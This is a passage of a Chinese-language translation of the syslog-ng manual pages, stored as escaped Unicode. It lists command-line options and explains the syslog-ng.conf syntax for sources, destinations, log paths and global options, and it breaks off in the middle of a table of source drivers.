ng\u5728\u5b89\u5168\u540e\u53f0\u6a21\u5f0f\u4e0b\u8fd0\u884c\u3002\u6b64\u6a21\u5f0f\u521b\u5efa\u4e00\u4e2a\u540d\u4e3asupervisoring syslog ng\u7684\u4e3b\u7ba1\u8fdb\u7a0b\uff0c\u5982\u679c\u7cfb\u7edf\u65e5\u5fd7ng\u5d29\u6e83\uff0c\u8be5\u8fdb\u7a0b\u5c06\u91cd\u65b0\u542f\u52a8\u3002 --stderr or -e \u5c06syslog ng\u7684\u5185\u90e8\u6d88\u606f\u8bb0\u5f55\u5230stderr\u3002\u4e3b\u8981\u4e0e--foreground\u9009\u9879\u4e00\u8d77\u7528\u4e8e\u8c03\u8bd5\u76ee\u7684\u3002\u5982\u679c\u672a\u6307\u5b9a\uff0csyslog ng\u5c06\u628a\u6b64\u7c7b\u6d88\u606f\u8bb0\u5f55\u5230\u5176\u5185\u90e8\u6e90\u3002 --syntax-only or -s \u9a8c\u8bc1\u914d\u7f6e\u6587\u4ef6\u7684\u8bed\u6cd5\u662f\u5426\u6b63\u786e\uff0c\u7136\u540e\u9000\u51fa\u3002 --user <user> or -u <user> \u5728\u521d\u59cb\u5316\u914d\u7f6e\u6587\u4ef6\uff08\u4ee5\u53ca\u53ef\u9009\u7684chrooting\uff09\u540e\u5207\u6362\u5230\u6307\u5b9a\u7684\u7528\u6237\u3002\u8bf7\u6ce8\u610f\uff0c\u5982\u679c\u6307\u5b9a\u7684\u7528\u6237\u6ca1\u6709\u521b\u5efa/dev/log\u6587\u4ef6\u7684\u6743\u9650\uff0c\u5219\u4e0d\u53ef\u80fd\u91cd\u65b0\u52a0\u8f7dsyslog ng\u914d\u7f6e\u3002 --verbose or -v \u542f\u7528\u7528\u4e8e\u6392\u9664syslog ng\u6545\u969c\u7684\u8be6\u7ec6\u65e5\u5fd7\u8bb0\u5f55\u3002 --version or -V \u663e\u793a\u7248\u672c\u53f7\u548c\u7f16\u8bd1\u4fe1\u606f\uff0c\u4ee5\u53ca\u53ef\u7528\u6a21\u5757\u7684\u5217\u8868\u548c\u7b80\u77ed\u63cf\u8ff0\u3002\u6709\u5173\u53ef\u7528\u6a21\u5757\u7684\u8be6\u7ec6\u63cf\u8ff0\uff0c\u8bf7\u53c2\u9605--module\u6ce8\u518c\u8868\u9009\u9879\u3002\u8bf7\u6ce8\u610f\uff0c\u5e76\u4e0d\u662f\u6240\u6709\u8fd9\u4e9b\u6a21\u5757\u90fd\u662f\u81ea\u52a8\u52a0\u8f7d\u7684\uff0c\u53ea\u6709\u5728--default modules\u9009\u9879\u4e2d\u6307\u5b9a\u7684\u6a21\u5757\u3002 --worker-threads \u8bbe\u7f6esyslog ng OSE\u53ef\u4ee5\u4f7f\u7528\u7684\u8f85\u52a9\u7ebf\u7a0b\u6570\uff0c\u5305\u62ec\u4e3bsyslog ng OS E\u7ebf\u7a0b\u3002\u8bf7\u6ce8\u610f\uff0csyslog ng OSE\u4e2d\u7684\u67d0\u4e9b\u64cd\u4f5c\u53ef\u4ee5\u4f7f\u7528\u4e0d\u53d7\u6b64\u9009\u9879\u9650\u5236\u7684\u7ebf\u7a0b\u3002\u53ea\u6709\u5f53syslog ng OSE\u5728\u591a\u7ebf\u7a0b\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0c\u6b64\u8bbe\u7f6e\u624d\u6709\u6548\u3002\u4ec5\u5728syslog ng Open Source Edition 3.3\u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u63d0\u4f9b\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605syslog ng Open Source Edition 3.3\u7ba1\u7406\u5458\u6307\u5357\u3002 \u5176\u4ed6 syslog-ng.conf(5) syslog ng OSE 3.3\u7ba1\u7406\u5458\u6307\u5357[1] \u5982\u679c\u60a8\u5728\u4f7f\u7528syslog ng\u65f6\u9047\u5230\u4efb\u4f55\u95ee\u9898\u6216\u9700\u8981\u5e2e\u52a9\uff0c\u8bf7\u8bbf\u95eesyslog ng wiki[3]\u6216syslog ng\u90ae\u4ef6\u5217\u8868[4]\u3002 \u6709\u5173syslog ng\u7684\u65b0\u95fb\u548c\u901a\u77e5\uff0c\u8bf7\u8bbf\u95eesyslog ng Insider\u535a\u5ba2[5]\u3002 \u4f5c\u8005 \u672c\u624b\u518c\u9875\u7531BalaBit\u6587\u6863\u56e2\u961f\u7f16\u5199<documentation@balabit.com>\u3002 \u7248\u6743 \u4f5c\u8005\u6839\u636eGNU\u901a\u7528\u516c\u5171\u8bb8\u53ef\u8bc1\u7b2c2\u7248\u6216\u66f4\u65b0\u7248\u672c\uff08GPL v2+\uff09\u7684\u6761\u6b3e\uff0c\u6388\u4e88\u590d\u5236\u3001\u5206\u53d1\u548c/\u6216\u4fee\u6539\u672c\u624b\u518c\u9875\u9762\u7684\u6743\u9650\u3002 \u540e\u8bb0 1. \u300asyslog ng\u5f00\u653e\u6e90\u4ee3\u7801\u7248\u7ba1\u7406\u5458\u6307\u5357\u300b http://www.balabit.com/support/documentation/ 2. syslog ng\u5b98\u65b9\u7f51\u7ad9 http://www.balabit.com/network-security/syslog-ng/ 3. \u8bbf\u95ee syslog-ng wiki http://www.balabit.com/wiki/syslog-ng-faq 4. syslog-ng \u90ae\u4ef6\u5217\u8868 https://lists.balabit.hu/mailman/listinfo/syslog-ng 5. syslog-ng \u5185\u90e8\u535a\u5ba2 http://insider.blogs.balabit.com \u914d\u7f6e\u6587\u4ef6 syslog-ng.conf SYSLOG-NG.CONF(5) The syslog-ng.conf \u624b\u518c\u9875 SYSLOG-NG.CONF(5) \u540d\u5b57 syslog-ng.conf - syslog-ng\u5e94\u7528\u7a0b\u5e8f \u914d\u7f6e\u6587\u4ef6 \u7b80\u4ecb syslog-ng.conf DESCRIPTION \u672c\u624b\u518c\u9875\u4ec5\u4e3a\u6458\u8981\uff1b\u6709\u5173syslog ng\u7684\u5b8c\u6574\u6587\u6863\uff0c\u8bf7\u53c2\u9605\u300asyslog ng\u5f00\u653e\u6e90\u4ee3\u7801\u7248\u7ba1\u7406\u5458\u6307\u5357\u300b[1]\u6216syslog ng\u5b98\u65b9\u7f51\u7ad9[2]\u3002syslog ng OSE\u5e94\u7528\u7a0b\u5e8f\u662f\u4e00\u4e2a\u7075\u6d3b\u4e14\u9ad8\u5ea6\u53ef\u6269\u5c55\u7684\u7cfb\u7edf\u65e5\u5fd7\u5e94\u7528\u7a0b\u5e8f\u3002\u901a\u5e38\uff0csyslog ng\u7528\u4e8e\u7ba1\u7406\u65e5\u5fd7\u6d88\u606f\u5e76\u5b9e\u73b0\u96c6\u4e2d\u5f0f\u65e5\u5fd7\u8bb0\u5f55\uff0c\u5176\u76ee\u7684\u662f\u5728\u5355\u4e2a\u4e2d\u592e\u65e5\u5fd7\u670d\u52a1\u5668\u4e0a\u6536\u96c6\u591a\u4e2a\u8bbe\u5907\u7684\u65e5\u5fd7\u6d88\u606f\u3002\u4e0d\u540c\u7684\u8bbe\u5907\uff08\u79f0\u4e3asyslog ng\u5ba2\u6237\u7aef\uff09\u90fd\u8fd0\u884csyslog ng\uff0c\u5e76\u4ece\u5404\u79cd\u5e94\u7528\u7a0b\u5e8f\u3001\u6587\u4ef6\u548c\u5176\u4ed6\u6765\u6e90\u6536\u96c6\u65e5\u5fd7\u6d88\u606f\u3002\u5ba2\u6237\u7aef\u5c06\u6240\u6709\u91cd\u8981\u7684\u65e5\u5fd7\u6d88\u606f\u53d1\u9001\u5230\u8fdc\u7a0bsyslog ng\u670d\u52a1\u5668\uff0c\u670d\u52a1\u5668\u5728\u90a3\u91cc\u5bf9\u5b83\u4eec\u8fdb\u884c\u6392\u5e8f\u548c\u5b58\u50a8\u3002syslog ng\u5e94\u7528\u7a0b\u5e8f\u8bfb\u53d6\u4f20\u5165\u6d88\u606f\u5e76\u5c06\u5176\u8f6c\u53d1\u5230\u9009\u5b9a\u7684\u76ee\u7684\u5730\u3002syslog ng\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u63a5\u6536\u6765\u81ea\u6587\u4ef6\u3001\u8fdc\u7a0b\u4e3b\u673a\u548c\u5176\u4ed6\u6765\u6e90\u7684\u6d88\u606f\u3002\u65e5\u5fd7\u6d88\u606f\u5728\u4e00\u4e2a\u5b9a\u4e49\u7684\u6e90\u4e2d\u8f93\u5165syslog ng\uff0c\u5e76\u53d1\u9001\u5230\u4e00\u4e2a\u6216\u591a\u4e2a\u76ee\u7684\u5730\u3002\u6765\u6e90\u548c\u76ee\u7684\u5730\u662f\u72ec\u7acb\u7684\u5bf9\u8c61\uff1b\u65e5\u5fd7\u8def\u5f84\u5b9a\u4e49syslogng\u5bf9\u6d88\u606f\u7684\u5904\u7406\u65b9\u5f0f\uff0c\u5c06\u6e90\u8fde\u63a5\u5230\u76ee\u6807\u3002\u65e5\u5fd7\u8def\u5f84\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u6e90\u548c\u4e00\u4e2a\u6216\u66f4\u591a\u4e2a\u76ee\u7684\u5730\u7ec4\u6210\uff1b\u4ece\u6e90\u5230\u8fbe\u7684\u6d88\u606f\u88ab\u53d1\u9001\u5230\u65e5\u5fd7\u8def\u5f84\u4e2d\u5217\u51fa\u7684\u6bcf\u4e2a\u76ee\u7684\u5730\u3002\u5728syslog ng\u4e2d\u5b9a\u4e49\u7684\u65e5\u5fd7\u8def\u5f84\u79f0\u4e3a\u65e5\u5fd7\u8bed\u53e5\u3002\u53ef\u9009\u5730\uff0c\u65e5\u5fd7\u8def\u5f84\u53ef\u4ee5\u5305\u62ec\u7b5b\u9009\u5668\u3002\u8fc7\u6ee4\u5668\u662f\u53ea\u9009\u62e9\u67d0\u4e9b\u6d88\u606f\u7684\u89c4\u5219\uff0c\u4f8b\u5982\uff0c\u53ea\u9009\u62e9\u7279\u5b9a\u5e94\u7528\u7a0b\u5e8f\u53d1\u9001\u7684\u6d88\u606f\u3002\u5982\u679c\u65e5\u5fd7\u8def\u5f84\u5305\u542b\u7b5b\u9009\u5668\uff0c\u5219syslog ng\u53ea\u5c06\u6ee1\u8db3\u7b5b\u9009\u5668\u89c4\u5219\u7684\u6d88\u606f\u53d1\u9001\u5230\u65e5\u5fd7\u8def\u5f84\u4e2d\u8bbe\u7f6e\u7684\u76ee\u7684\u5730\u3002 \u914d\u7f6e SYSLOG-NG \u914d\u7f6e\u6587\u4ef6\u7684\u4e3b\u4f53\u7531\u5bf9\u8c61\u5b9a\u4e49\u7ec4\u6210\uff1a\u6e90\u3001\u76ee\u7684\u5730\u3001\u65e5\u5fd7\u8def\u5f84\u5b9a\u4e49\u63a5\u6536\u7684\u65e5\u5fd7\u6d88\u606f\u4ee5\u53ca\u53d1\u9001\u7684\u4f4d\u7f6e\u3002syslog ng\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u6807\u8bc6\u7b26\u3001\u9009\u9879\u540d\u79f0\u548c\u5c5e\u6027\u4ee5\u53ca\u4efb\u4f55\u5176\u4ed6\u5b57\u7b26\u4e32\u90fd\u533a\u5206\u5927\u5c0f\u5199\u3002\u5728\u53e6\u4e00\u4e2a\u8bed\u53e5\u4e2d\u5f15\u7528\u5bf9\u8c61\u4e4b\u524d\uff0c\u5fc5\u987b\u5148\u5b9a\u4e49\u5bf9\u8c61\u3002\u5bf9\u8c61\u5b9a\u4e49\uff08\u4e5f\u79f0\u4e3a\u8bed\u53e5\uff09\u5177\u6709\u4ee5\u4e0b\u8bed\u6cd5\uff1a object_type object_id {<options>}; \u00b7\u5bf9\u8c61\u7684\u7c7b\u578b: \u6e90, \u76ee\u7684\u5730, \u65e5\u5fd7, \u6ee4\u6ce2\u5668, \u89e3\u6790\u5668, \u91cd\u5199\u89c4\u5219, \u6216\u8005 \u6a21\u677f. \u00b7object_id: \u6807\u8bc6\u5bf9\u8c61\u7684\u552f\u4e00\u540d\u79f0\u3002\u4f7f\u7528\u4fdd\u7559\u5b57\u4f5c\u4e3a\u6807\u8bc6\u7b26\u65f6\uff0c\u8bf7\u5c06\u6807\u8bc6\u7b26\u7528\u5f15\u53f7\u62ec\u8d77\u6765\u3002 \u63d0\u793a\uff1a\u4f7f\u7528\u4e0e\u4ed6\u4eec\u8bc6\u522b\u7684\u5bf9\u8c61\u7c7b\u578b\u76f8\u5173\u7684\u6807\u8bc6\u7b26\u3002\u4f8b\u5982\uff0c\u7528s_\u4f5c\u4e3a\u6e90\u5bf9\u8c61\u7684\u524d\u7f00\uff0c\u7528d_\u4f5c\u4e3a\u76ee\u7684\u5730\u7684\u524d\u7f00\uff0c\u4f9d\u6b64\u7c7b\u63a8\u3002 \u00b7Parameters: \u5bf9\u8c61\u7684\u53c2\u6570\uff0c\u7528\u5927\u62ec\u53f7\uff5bparameters\uff5d\u62ec\u8d77\u6765\u3002 \u00b7Semicolon: \u5bf9\u8c61\u5b9a\u4e49\u4ee5\u5206\u53f7\uff08\uff1b\uff09\u7ed3\u5c3e\u3002 \u4f8b\u5982\uff0c\u4e0b\u9762\u7684\u884c\u5b9a\u4e49\u4e86\u4e00\u4e2a\u6e90\uff0c\u5e76\u5c06\u5176\u79f0\u4e3as_internal\u3002 source s_internal { internal(); }; \u7a0d\u540e\u53ef\u4ee5\u4f7f\u7528\u5bf9\u8c61\u7684ID\u5728\u5176\u4ed6\u8bed\u53e5\u4e2d\u5f15\u7528\u8be5\u5bf9\u8c61\uff0c\u4f8b\u5982\uff0c\u4ee5\u524d\u7684\u6e90\u7528\u4f5c\u4ee5\u4e0b\u65e5\u5fd7\u8bed\u53e5\u7684\u53c2\u6570\uff1a log { source(s_internal); destination(d_file); }; \u00b7\u8bed\u53e5\u4e2d\u7684\u53c2\u6570\u548c\u9009\u9879\u7c7b\u4f3c\u4e8eC\u7f16\u7a0b\u8bed\u8a00\u7684\u51fd\u6570\u8c03\u7528\uff1a\u9009\u9879\u7684\u540d\u79f0\u540e\u9762\u8ddf\u7740\u4e00\u4e2a\u53c2\u6570\u5217\u8868\uff0c\u53c2\u6570\u5217\u8868\u62ec\u5728\u62ec\u53f7\u5185\uff0c\u5e76\u4ee5\u5206\u53f7\u7ed3\u675f\u3002 option(parameter1, parameter2); option2(parameter1, parameter2); \u4f8b\u5982\uff0c\u4ee5\u4e0b\u6e90\u8bed\u53e5\u6709\u4e09\u4e2a\u9009\u9879\uff1b\u524d\u4e24\u4e2a\u9009\u9879\uff08file\uff08\uff09\u548cfollow_freq\uff08\uff09\uff09\u53ea\u6709\u4e00\u4e2a\u53c2\u6570\uff0c\u800c\u7b2c\u4e09\u4e2a\u9009\u9879\uff08flags\uff08\uff09\uff09\u6709\u4e24\u4e2a\u53c2\u6570\uff1a source s_tail { file(\"/var/log/apache/access.log\" follow_freq(1) flags(no-parse, validate-utf8)); }; \u5bf9\u8c61\u53ef\u80fd\u5177\u6709\u5fc5\u9700\u53c2\u6570\u548c\u53ef\u9009\u53c2\u6570\u3002\u5fc5\u9700\u7684\u53c2\u6570\u662f\u4f4d\u7f6e\u53c2\u6570\uff0c\u8fd9\u610f\u5473\u7740\u5fc5\u987b\u6309\u7167\u5b9a\u4e49\u7684\u987a\u5e8f\u6307\u5b9a\u8fd9\u4e9b\u53c2\u6570\u3002\u53ef\u4ee5\u4f7f\u7528\u9009\u9879\uff08\u503c\uff09\u683c\u5f0f\u4ee5\u4efb\u4f55\u987a\u5e8f\u6307\u5b9a\u53ef\u9009\u53c2\u6570\u3002\u5982\u679c\u672a\u6307\u5b9a\u53c2\u6570\uff08\u53ef\u9009\u6216\u5fc5\u9700\uff09\uff0c\u5219\u4f7f\u7528\u5176\u9ed8\u8ba4\u503c\u3002\u53c2\u6570\u53ca\u5176\u9ed8\u8ba4\u503c\u5217\u5728\u7279\u5b9a\u5bf9\u8c61\u7684\u53c2\u7167\u90e8\u5206\u4e2d\u3002 \u793a\u4f8b1\u3002\u4f7f\u7528\u5fc5\u9700\u548c\u53ef\u9009\u53c2\u6570unix-stream\uff08\uff09\u6e90\u9a71\u52a8\u7a0b\u5e8f\u6709\u4e00\u4e2a\u5fc5\u9700\u7684\u53c2\u6570\uff1a\u8981\u4fa6\u542c\u7684\u5957\u63a5\u5b57\u7684\u540d\u79f0\u3002\u53ef\u9009\u53c2\u6570\u4ee5\u4efb\u4f55\u987a\u5e8f\u8ddf\u968f\u5957\u63a5\u5b57\u540d\u79f0\uff0c\u56e0\u6b64\u4ee5\u4e0b\u6e90\u5b9a\u4e49\u5177\u6709\u76f8\u540c\u7684\u6548\u679c\uff1a source s_demo_stream1 {unix-stream(\"/dev/log\" max-connections(10) group(log)); }; source s_demo_stream2 {unix-stream(\"/dev/log\" group(log) max-connections(10)); }; \u00b7\u6709\u4e9b\u9009\u9879\u662f\u5168\u5c40\u9009\u9879\uff0c\u6216\u8005\u53ef\u4ee5\u5168\u5c40\u8bbe\u7f6e\uff0c\u4f8b\u5982\uff0csyslog ng OSE\u662f\u5426\u5e94\u8be5\u4f7f\u7528DNS\u89e3\u6790\u6765\u89e3\u6790IP\u5730\u5740\u3002\u5168\u5c40\u9009\u9879\u8be6\u89c1\uff1f\uff1f\uff1f\u3002 options { use_dns(no); }; \u00b7syslog ng\u914d\u7f6e\u6587\u4ef6\u4e2d\u4f7f\u7528\u7684\u6240\u6709\u6807\u8bc6\u7b26\u3001\u5c5e\u6027\u548c\u4efb\u4f55\u5176\u4ed6\u5b57\u7b26\u4e32\u90fd\u533a\u5206\u5927\u5c0f\u5199\u3002 \u00b7\u5bf9\u8c61\u53ef\u4ee5\u5728\u5b9a\u4e49\u4e4b\u524d\u4f7f\u7528\u3002 \u00b7\u8981\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u6ce8\u91ca\uff0c\u8bf7\u4ee5#\u5f00\u5934\u4e00\u884c\uff0c\u7136\u540e\u5199\u4e0b\u60a8\u7684\u6ce8\u91ca\u3002syslog ng\u5c06\u5ffd\u7565\u8fd9\u4e9b\u884c\u3002 # \u6ce8\u91ca: \u8fd9\u662f\u4e00\u4e2a\u6d41\u6e90 source s_demo_stream {unix-stream(\"/dev/log\" max-connections(10) group(log)); }; \u65e5\u5fd7\u8bed\u53e5\u7684\u8bed\u6cd5\u5982\u4e0b\uff1a log { source(s1); source(s2); ... optional_element(filter1|parser1|rewrite1); optional_element(filter2|parser2|rewrite2);... destination(d1); destination(d2); ... flags(flag1[, flag2...]); }; \u4e0b\u9762\u7684log\u8bed\u53e5\u5c06\u6240\u6709\u5230\u8fbe\u672c\u5730\u4e3b\u673a\u7684\u6d88\u606f\u53d1\u9001\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\u3002 source s_localhost { tcp(ip(127.0.0.1) port(1999) ); }; destination d_tcp { tcp(\"10.1.2.3\" port(1999); localport(999)); }; log { source(s_localhost); destination(d_tcp); }; syslog-ng\u5e94\u7528\u7a0b\u5e8f\u6709\u8bb8\u591a\u5168\u5c40\u9009\u9879\u6765\u7ba1\u7406DNS\u4f7f\u7528\u3001\u4f7f\u7528\u7684\u65f6\u95f4\u6233\u683c\u5f0f\u4ee5\u53ca\u5176\u4ed6\u5e38\u89c4\u70b9\u3002\u6bcf\u4e2a\u9009\u9879\u53ef\u80fd\u90fd\u6709\u53c2\u6570\uff0c\u7c7b\u4f3c\u4e8e\u9a71\u52a8\u7a0b\u5e8f\u89c4\u8303\u3002\u8981\u8bbe\u7f6e\u5168\u5c40\u9009\u9879\uff0c\u8bf7\u4f7f\u7528\u4ee5\u4e0b\u8bed\u6cd5\u5c06\u9009\u9879\u8bed\u53e5\u6dfb\u52a0\u5230syslog ng\u914d\u7f6e\u6587\u4ef6\u4e2d\uff1a options { option1(params); option2(params); ... }; \u4e0b\u9762\u5217\u51fa\u4e86syslog ng\u4e2d\u53ef\u7528\u7684\u6e90\u3001\u76ee\u6807\u548c\u7b5b\u9009\u5668\u3002\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u300asyslog ng\u7ba1\u7406\u5458\u6307\u5357\u300b[1]\u3002 - .sp \u88681\u3002syslog ng\u4e2d\u53ef\u7528\u7684\u6e90\u9a71\u52a8\u7a0b\u5e8f \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510 \u2502\u540d\u5b57 \u2502 \u63cf\u8ff0 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502internal() \u2502 \u5728syslog ng\u4e2d\u5185\u90e8\u751f\u6210\u7684\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502file() \u2502 \u6253\u5f00\u6307\u5b9a\u7684\u6587\u4ef6\u5e76\u8bfb\u53d6\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502pipe(), fifo \u2502 \u6253\u5f00\u6307\u5b9a\u7684\u547d\u540d\u7ba1\u9053\u5e76\u8bfb\u53d6\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502pacct() \u2502 \u4eceLinux\u4e0a\u7684\u8fdb\u7a0b\u8bb0\u5e10\u65e5\u5fd7\u4e2d\u8bfb\u53d6\u6d88\u606f \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502program() \u2502 \u6253\u5f00\u6307\u5b9a\u7684\u5e94\u7528\u7a0b\u5e8f\u5e76\u4ece\u5176\u6807\u51c6\u8f93\u51fa\u4e2d\u8bfb\u53d6\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502sun-stream(), sun-streams() \u2502\u5728Solaris\u7cfb\u7edf\u4e0a\u6253\u5f00\u6307\u5b9a\u7684STREAMS\u8bbe\u5907\u5e76\u8bfb\u53d6\u4f20\u5165\u6d88\u606f\u3002 \u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502syslog() \u2502 \u4f7f\u7528\u65b0\u7684IETF\u6807\u51c6syslog\u534f\u8bae\u4fa6\u542c\u4f20\u5165\u6d88\u606f\u3002 | \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502system() \u2502 \u81ea\u52a8\u68c0\u6d4bsyslog ng OSE\u5728\u54ea\u4e2a\u5e73\u53f0\u4e0a\u8fd0\u884c\uff0c\u5e76\u6536\u96c6\u8be5\u5e73\u53f0\u7684\u672c\u673a\u65e5\u5fd7\u6d88\u606f\u3002\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502tcp(), tcp6() \u2502 \u5206\u522b\u901a\u8fc7IPv4\u548cIPv6\u7f51\u7edc\u4f7f\u7528BSD syslog\u534f\u8bae\u5728\u6307\u5b9a\u7684TCP\u7aef\u53e3\u4e0a\u4fa6\u542c\u4f20\u5165\u6d88\u606f\u3002\u2502 \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524 \u2502udp(), udp6() \u2502 \u5206\u522b\u901a\u8fc7IPv4\u548cIPv6\u7f51\u7edc\u4f7f\u7528BSD 